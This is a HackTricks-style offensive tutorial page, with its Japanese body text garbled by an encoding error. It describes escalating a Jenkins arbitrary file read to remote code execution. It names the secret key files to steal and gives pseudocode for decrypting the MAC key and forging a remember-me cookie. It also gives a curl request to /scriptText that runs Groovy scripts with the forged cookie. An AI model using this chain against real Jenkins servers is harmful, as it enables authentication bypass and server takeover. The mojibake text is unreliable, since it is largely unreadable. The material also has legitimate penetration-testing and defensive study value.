# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ã“ã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã§ã¯ã€Jenkinsã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³è„†å¼±æ€§ã‚’RCEã«å¤‰æ›ã™ã‚‹ç´ æ™´ã‚‰ã—ã„æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

ã“ã‚Œã¯ã€ä»»æ„ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒRCEã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹æŠ•ç¨¿ã®éƒ¨åˆ†ã®AIã«ã‚ˆã£ã¦ä½œæˆã•ã‚ŒãŸè¦ç´„ã§ã™ã€‚è‡ªåˆ†ã§è¦ç´„ã‚’ä½œæˆã™ã‚‹æ™‚é–“ãŒã§ãã‚‹ã¾ã§ã®é–“ã®ã‚‚ã®ã§ã™:

### æ”»æ’ƒã®å‰ææ¡ä»¶

* **æ©Ÿèƒ½è¦ä»¶:** "Remember me"ãŒæœ‰åŠ¹ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®šï¼‰ã€‚
* **ã‚¢ã‚¯ã‚»ã‚¹ãƒ¬ãƒ™ãƒ«:** æ”»æ’ƒè€…ã¯å…¨ä½“/èª­ã¿å–ã‚Šæ¨©é™ãŒå¿…è¦ã§ã™ã€‚
* **ç§˜å¯†ã‚¢ã‚¯ã‚»ã‚¹:** é‡è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ãƒã‚¤ãƒŠãƒªãŠã‚ˆã³ãƒ†ã‚­ã‚¹ãƒˆã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’èª­ã¿å–ã‚‹èƒ½åŠ›ã€‚

### è©³ç´°ãªæ‚ªç”¨ãƒ—ãƒ­ã‚»ã‚¹

#### ã‚¹ãƒ†ãƒƒãƒ—1: ãƒ‡ãƒ¼ã‚¿åé›†

**ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã®å–å¾—**

* å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«`$JENKINS_HOME/users/*.xml`ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼è¨­å®šã¨ç§˜å¯†ã‚’ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦åé›†ã—ã¾ã™:
* **ãƒ¦ãƒ¼ã‚¶ãƒ¼å**
* **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚·ãƒ¼ãƒ‰**
* **ã‚¿ã‚¤ãƒ ã‚¹ã‚¿ãƒ³ãƒ—**
* **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥**

**ç§˜å¯†éµã®æŠ½å‡º**

* ã‚¯ãƒƒã‚­ãƒ¼ã®ç½²åã«ä½¿ç”¨ã•ã‚Œã‚‹æš—å·éµã‚’æŠ½å‡ºã—ã¾ã™:
* **ç§˜å¯†éµ:** `$JENKINS_HOME/secret.key`
* **ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼:** `$JENKINS_HOME/secrets/master.key`
* **MACã‚­ãƒ¼ã®ãƒ•ã‚¡ã‚¤ãƒ«:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### ã‚¹ãƒ†ãƒƒãƒ—2: ã‚¯ãƒƒã‚­ãƒ¼ã®å½é€ 

**ãƒˆãƒ¼ã‚¯ãƒ³ã®æº–å‚™**

*   **ãƒˆãƒ¼ã‚¯ãƒ³ã®æœ‰åŠ¹æœŸé™ã‚’è¨ˆç®—:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // ç¾åœ¨ã®æ™‚é–“ã«1æ™‚é–“ã‚’è¿½åŠ 
```
{% endcode %}
*   **ãƒˆãƒ¼ã‚¯ãƒ³ã®ãŸã‚ã®ãƒ‡ãƒ¼ã‚¿ã‚’é€£çµ:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MACã‚­ãƒ¼ã®å¾©å·åŒ–**

*   **MACã‚­ãƒ¼ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¾©å·åŒ–:**

```javascript
key = toAes128Key(masterKey)  // ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼ã‚’AES128ã‚­ãƒ¼å½¢å¼ã«å¤‰æ›
decrypted = AES.decrypt(macFile, key)  // .macãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¾©å·åŒ–
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**ç½²åã®è¨ˆç®—**

*   **HMAC SHA256ã‚’è¨ˆç®—:**

```javascript
mac = HmacSHA256(token, macKey)  // ãƒˆãƒ¼ã‚¯ãƒ³ã¨MACã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦HMACã‚’è¨ˆç®—
tokenSignature = bytesToHexString(mac)  // MACã‚’16é€²æ•°æ–‡å­—åˆ—ã«å¤‰æ›
```

**ã‚¯ãƒƒã‚­ãƒ¼ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**

*   **æœ€çµ‚ã‚¯ãƒƒã‚­ãƒ¼ã‚’ç”Ÿæˆ:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // ã‚¯ãƒƒã‚­ãƒ¼ã®ãƒ‡ãƒ¼ã‚¿ã‚’Base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰
```
{% endcode %}

#### ã‚¹ãƒ†ãƒƒãƒ—3: ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ

**ã‚»ãƒƒã‚·ãƒ§ãƒ³èªè¨¼**

* **CSRFãŠã‚ˆã³ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—:**
* `/crumbIssuer/api/json`ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¦`Jenkins-Crumb`ã‚’å–å¾—ã—ã¾ã™ã€‚
* å¿œç­”ã‹ã‚‰`JSESSIONID`ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã€remember-meã‚¯ãƒƒã‚­ãƒ¼ã¨ä¸€ç·’ã«ä½¿ç”¨ã—ã¾ã™ã€‚

**ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œãƒªã‚¯ã‚¨ã‚¹ãƒˆ**

*   **Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€Jenkinsç’°å¢ƒå†…ã§ã‚·ã‚¹ãƒ†ãƒ ãƒ¬ãƒ™ãƒ«ã®ã‚³ãƒãƒ³ãƒ‰ã‚„ä»–ã®æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

æä¾›ã•ã‚ŒãŸcurlã‚³ãƒãƒ³ãƒ‰ã®ä¾‹ã¯ã€å¿…è¦ãªãƒ˜ãƒƒãƒ€ãƒ¼ã¨ã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦Jenkinsã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®‰å…¨ã«å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
